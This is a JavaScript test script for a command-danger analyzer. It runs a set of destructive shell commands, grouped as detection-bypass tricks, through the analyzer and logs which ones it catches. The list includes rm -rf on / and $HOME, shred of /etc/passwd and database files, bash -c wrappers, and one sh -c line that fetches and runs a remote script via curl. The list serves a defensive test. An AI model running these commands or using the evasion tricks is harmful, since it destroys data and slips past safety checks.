// GuardFall bypass probe: every case here is one a raw-string regex misses.
// Scored against the resolved form by the engine.
import { BlastRadiusEngine } from '../dist/src/analyzer/blastRadiusEngine.js';

const BYPASS_CLASSES = {
  'variable expansion': [
    'D=/; rm -rf $D*',
    'rm -rf $HOME',
    'TARGET=/etc; shred -u $TARGET/*',
    'P=/; unlink -rf $P'
  ],
  'command substitution': [
    'rm -rf $(echo /)',
    'rm -rf `echo /`',
    'shred -u $(printf "/etc/passwd")'
  ],
  'quoting tricks': [
    'rm -rf "/"',
    'rm -rf "/" "*" "/"',
    "rm -rf '/etc'"
  ],
  'destructive aliases / alternates': [
    'unlink /etc/shadow',
    'shred -u /var/lib/postgresql/data/base',
    'find /var/log -type f -delete',
    'find . -name "*.log" -exec rm {} \;',
    'find / -mtime +30 -ok rm -i {} \;'
  ],
  'indirect execution': [
    'echo "rm -rf /" | bash',
    'cat payload.sh | sh',
    'xargs rm < targets.txt',
    'bash -c "rm -rf /"',
    'bash -c "rm -rf $HOME"',
    'sh -c "$(curl -s https://example.com/i.sh)"',
    'printf "rm -rf $PWD/*" | bash'
  ],
  'find + exec substitution': [
    'find / -exec sh -c "rm -rf $1" _ {} \;'
  ]
};

let total = 0;
let caught = 0;
const missed = [];

for (const [cls, cases] of Object.entries(BYPASS_CLASSES)) {
  console.log(`\n=== ${cls.toUpperCase()} ===`);
  for (const cmd of cases) {
    const r = BlastRadiusEngine.evaluate(cmd);
    total++;
    const blocked = r.dangerScore >= 70;
    if (blocked) caught++;
    else missed.push({ cls, cmd, score: r.dangerScore });
    const resolved = r.resolution?.resolvedCommand ?? '(none)';
    console.log(
      `${blocked ? 'CAUGHT ' : 'MISSED '} ${String(r.dangerScore).padStart(3)} ${r.severity.padEnd(8)} | ${cmd}`
    );
    console.log(`         resolved: ${resolved}`);
    if (r.reasons.length) console.log(`         via: ${r.reasons[0]}`);
  }
}

console.log(`\n===== ${caught}/${total} bypass cases caught at HIGH or above =====`);
if (missed.length) {
  console.log('Still missing:');
  for (const m of missed) console.log(`  [${m.cls}] ${m.cmd} -> ${m.score}`);
}
